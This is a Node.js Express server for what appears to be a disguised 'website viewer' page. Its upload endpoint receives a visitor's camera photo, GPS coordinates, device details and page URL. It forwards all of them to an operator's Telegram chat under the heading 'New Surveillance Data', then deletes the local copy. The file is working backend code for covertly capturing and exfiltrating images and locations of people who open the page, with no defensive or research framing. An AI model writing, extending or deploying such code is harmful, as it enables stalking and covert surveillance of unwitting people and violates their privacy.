require('dotenv').config();
const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// Telegram Bot Setup
const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: false });

// Multer setup
const upload = multer({
  dest: 'uploads/',
  limits: { fileSize: 10 * 1024 * 1024 }
});

// Middleware
app.use(express.json({ limit: '10mb' }));
app.use(express.static('public'));

// Main route - Custom website viewer
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Admin panel route
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// Photo upload endpoint
app.post('/upload-photo', upload.single('photo'), async (req, res) => {
  try {
    const { location, browserInfo, pageUrl } = req.body;
    const photoPath = req.file.path;

    const locationData = JSON.parse(location);
    const browserData = JSON.parse(browserInfo);

    let message = '📸 New Surveillance Data\n\n';
    
    // Page URL info
    if (pageUrl) {
      message += `🌐 Viewing Page:\n${pageUrl}\n\n`;
    }
    
    // Location info
    if (locationData.latitude) {
      message += `📍 Location:\n`;
      message += `Lat: ${locationData.latitude}\n`;
      message += `Lng: ${locationData.longitude}\n`;
      message += `Accuracy: ${locationData.accuracy}m\n\n`;
    }

    // Browser info
    message += `💻 Device Info:\n`;
    message += `Platform: ${browserData.platform}\n`;
    message += `Screen: ${browserData.screenWidth}x${browserData.screenHeight}\n`;
    message += `Time: ${new Date(browserData.timestamp).toLocaleString()}\n`;

    // Send photo
    await bot.sendPhoto(process.env.TELEGRAM_CHAT_ID, fs.createReadStream(photoPath), {
      caption: message
    });

    // Send location
    if (locationData.latitude) {
      await bot.sendLocation(
        process.env.TELEGRAM_CHAT_ID,
        locationData.latitude,
        locationData.longitude
      );
    }

    fs.unlinkSync(photoPath);
    res.json({ success: true });
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

app.listen(PORT, () => {
  console.log(`🚀 Server: http://localhost:${PORT}`);
  console.log(`⚙️ Admin: http://localhost:${PORT}/admin`);
});
